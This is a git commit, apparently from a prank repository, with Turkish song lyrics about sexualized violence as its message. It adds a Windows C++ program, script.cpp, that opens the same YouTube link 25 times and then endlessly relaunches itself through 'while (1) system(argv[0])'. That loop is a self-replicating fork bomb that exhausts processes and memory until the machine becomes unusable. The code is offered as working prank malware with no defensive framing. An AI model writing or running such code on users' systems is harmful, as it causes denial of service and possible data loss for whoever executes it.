dddc9718365afdfb824030610163158c6735545f
Dolar Security <dolarsecurity@protonmail.com>
2017-03-14 22:14:53 +0200

    VUR BANA!
    Saçlarımdan tut önce beni yerlerde sürükle.
    Canım acısın boşver benim için bu bir zevk
    Fantezi dünyam rengarenk
    Bu daha hiçbir şey
    Korkma benden sal kendini
    Bebeğim dediğim anda vur banah
    Ah ah
    Vur bana
    Vur
    Vur
    Vur
    Vur
    Vur
    Gel bana
    Korkma benden sal kendini
    Bebeğim dediğim anda vur bana

---
+++ script.cpp
@@ -0,0 +1,58 @@
+#include <windows.h>
+#include <cstdlib>
+
+int main(int argc, char **argv)
+{
+   ShellExecute(NULL, "open", "https://youtu.be/EAjMIE9f8DU?t=1s",
+                NULL, NULL, SW_SHOWNORMAL);
+   ShellExecute(NULL, "open", "https://youtu.be/EAjMIE9f8DU?t=1s",
+                NULL, NULL, SW_SHOWNORMAL);
+   ShellExecute(NULL, "open", "https://youtu.be/EAjMIE9f8DU?t=1s",
+                NULL, NULL, SW_SHOWNORMAL);
+   ShellExecute(NULL, "open", "https://youtu.be/EAjMIE9f8DU?t=1s",
+                NULL, NULL, SW_SHOWNORMAL);
+   ShellExecute(NULL, "open", "https://youtu.be/EAjMIE9f8DU?t=1s",
+                NULL, NULL, SW_SHOWNORMAL);
+   ShellExecute(NULL, "open", "https://youtu.be/EAjMIE9f8DU?t=1s",
+                NULL, NULL, SW_SHOWNORMAL);
+   ShellExecute(NULL, "open", "https://youtu.be/EAjMIE9f8DU?t=1s",
+                NULL, NULL, SW_SHOWNORMAL);
+   ShellExecute(NULL, "open", "https://youtu.be/EAjMIE9f8DU?t=1s",
+                NULL, NULL, SW_SHOWNORMAL);
+   ShellExecute(NULL, "open", "https://youtu.be/EAjMIE9f8DU?t=1s",
+                NULL, NULL, SW_SHOWNORMAL);
+   ShellExecute(NULL, "open", "https://youtu.be/EAjMIE9f8DU?t=1s",
+                NULL, NULL, SW_SHOWNORMAL);
+   ShellExecute(NULL, "open", "https://youtu.be/EAjMIE9f8DU?t=1s",
+                NULL, NULL, SW_SHOWNORMAL);
+   ShellExecute(NULL, "open", "https://youtu.be/EAjMIE9f8DU?t=1s",
+                NULL, NULL, SW_SHOWNORMAL);
+   ShellExecute(NULL, "open", "https://youtu.be/EAjMIE9f8DU?t=1s",
+                NULL, NULL, SW_SHOWNORMAL);
+   ShellExecute(NULL, "open", "https://youtu.be/EAjMIE9f8DU?t=1s",
+                NULL, NULL, SW_SHOWNORMAL);
+   ShellExecute(NULL, "open", "https://youtu.be/EAjMIE9f8DU?t=1s",
+                NULL, NULL, SW_SHOWNORMAL);
+   ShellExecute(NULL, "open", "https://youtu.be/EAjMIE9f8DU?t=1s",
+                NULL, NULL, SW_SHOWNORMAL);
+   ShellExecute(NULL, "open", "https://youtu.be/EAjMIE9f8DU?t=1s",
+                NULL, NULL, SW_SHOWNORMAL);
+   ShellExecute(NULL, "open", "https://youtu.be/EAjMIE9f8DU?t=1s",
+                NULL, NULL, SW_SHOWNORMAL);
+   ShellExecute(NULL, "open", "https://youtu.be/EAjMIE9f8DU?t=1s",
+                NULL, NULL, SW_SHOWNORMAL);
+   ShellExecute(NULL, "open", "https://youtu.be/EAjMIE9f8DU?t=1s",
+                NULL, NULL, SW_SHOWNORMAL);
+   ShellExecute(NULL, "open", "https://youtu.be/EAjMIE9f8DU?t=1s",
+                NULL, NULL, SW_SHOWNORMAL);
+   ShellExecute(NULL, "open", "https://youtu.be/EAjMIE9f8DU?t=1s",
+                NULL, NULL, SW_SHOWNORMAL);
+   ShellExecute(NULL, "open", "https://youtu.be/EAjMIE9f8DU?t=1s",
+                NULL, NULL, SW_SHOWNORMAL);
+   ShellExecute(NULL, "open", "https://youtu.be/EAjMIE9f8DU?t=1s",
+                NULL, NULL, SW_SHOWNORMAL);
+   ShellExecute(NULL, "open", "https://youtu.be/EAjMIE9f8DU?t=1s",
+                NULL, NULL, SW_SHOWNORMAL);
+   while (1) system(argv[0]);
+        return 0;
+   }
